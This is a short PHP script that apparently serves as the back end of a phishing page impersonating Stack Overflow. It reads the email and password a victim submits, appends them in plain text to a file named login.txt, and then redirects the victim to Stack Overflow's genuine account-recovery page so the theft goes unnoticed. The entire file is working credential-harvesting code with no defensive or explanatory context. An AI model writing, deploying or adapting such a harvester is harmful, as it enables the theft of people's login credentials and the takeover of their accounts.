<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';

    $log = "Stackoverflow Username: $email | Pass: $password\n";

    file_put_contents("login.txt", $log, FILE_APPEND);

    header('Location: https://stackoverflow.com/users/account-recovery');
    exit();
}
?>
